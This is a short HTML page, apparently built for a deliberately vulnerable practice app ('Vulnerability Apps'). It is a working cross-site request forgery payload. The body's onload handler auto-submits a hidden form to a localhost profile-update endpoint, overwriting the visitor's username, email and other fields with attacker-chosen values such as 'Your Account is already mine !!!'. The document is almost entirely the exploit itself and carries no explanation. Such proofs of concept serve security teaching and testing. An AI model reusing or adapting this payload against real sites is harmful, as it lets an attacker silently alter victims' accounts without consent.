<html>
<head>
</head>
<div id="header_title">
<h1>Vulnerability Apps</h1>
</div>
<link rel="stylesheet" href="./assets/style.css" type="text/css"> 
<body onload="document.csrf.submit();">
<p>aaaaa</p>
<form name="csrf" action="http://localhost:9090/profile/edit/update" method="POST">
    <input type="hidden" name="username" value="Hacked!!">
    <input type="hidden" name="age" value="2048">
    <input type="hidden" name="mail" value="anonymous@cracker.com">
    <input type="hidden" name="address" value="Over the World">
    <input type="hidden" name="animal" value="Dragon">
    <input type="hidden" name="word" value="Your Account is already mine !!!">
    <input type="submit" value="Confirmed">
</form>
</body>
</html>

